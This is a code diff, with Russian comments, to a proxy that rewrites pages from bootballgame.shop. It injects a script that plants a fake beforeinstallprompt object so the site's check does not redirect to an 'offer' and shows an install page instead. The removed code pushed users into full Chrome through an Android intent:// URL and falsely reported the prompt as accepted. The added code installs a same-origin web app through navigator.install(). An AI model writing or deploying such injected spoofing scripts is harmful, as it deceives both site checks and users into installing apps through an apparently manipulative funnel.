@@ -84,34 +84,44 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
     // ─── Инжекция фейкового deferredPrompt ──────────────────────────────
     // bootballgame.shop JS проверяет window.deferredPrompt != null через 1 сек.
     // Если null → редирект на оффер. Подделываем чтобы показать install page.
-    // При вызове prompt() → открываем bootballgame.shop в Chrome через intent.
+    // При вызове prompt() → используем Web Install API (Chrome 143+, same-origin).
     const fakePromptScript = `<script>
 (function() {
-  // Получаем параметры из текущего URL для передачи на bootballgame.shop
-  var params = window.location.search || '';
-  var targetUrl = 'https://bootballgame.shop/' + params;
-
   // Фейковый beforeinstallprompt event
   var fakeEvent = {
     preventDefault: function() {},
     prompt: function() {
-      // При нажатии "Установить" → открываем bootballgame.shop в Chrome
-      // intent:// заставляет Android открыть URL в полном Chrome, не CCT
-      var intentUrl = 'intent://' + targetUrl.replace('https://', '') +
-        '#Intent;scheme=https;package=com.android.chrome;end';
-      window.location.href = intentUrl;
-      return Promise.resolve({ outcome: 'accepted', platform: '' });
+      // Web Install API (Chrome 143+) — устанавливает PWA same-origin
+      // Manifest на /go/manifest.webmanifest, scope /go/
+      if (navigator.install) {
+        return navigator.install().then(function() {
+          return { outcome: 'accepted', platform: '' };
+        }).catch(function(err) {
+          console.warn('[Proxy] navigator.install() failed:', err);
+          // Fallback: показываем нативный браузерный install prompt
+          // через дефолтный Chrome механизм
+          return { outcome: 'dismissed', platform: '' };
+        });
+      }
+      // Fallback для Chrome < 143: пробуем beforeinstallprompt если он придёт
+      if (window.__realDeferredPrompt) {
+        return window.__realDeferredPrompt.prompt();
+      }
+      console.warn('[Proxy] No install method available');
+      return Promise.resolve({ outcome: 'dismissed', platform: '' });
     },
-    userChoice: Promise.resolve({ outcome: 'accepted', platform: '' })
+    userChoice: new Promise(function(resolve) {
+      // Резолвится когда реальный prompt завершится
+      window.__resolveUserChoice = resolve;
+    })
   };
 
   window.deferredPrompt = fakeEvent;
 
-  // Также перехватываем событие beforeinstallprompt если оно сработает реально
-  var origDeferredPrompt = null;
+  // Перехватываем реальный beforeinstallprompt если сработает
   window.addEventListener('beforeinstallprompt', function(e) {
     e.preventDefault();
-    origDeferredPrompt = e;
+    window.__realDeferredPrompt = e;
     // Подменяем фейковый на реальный!
     window.deferredPrompt = e;
   });
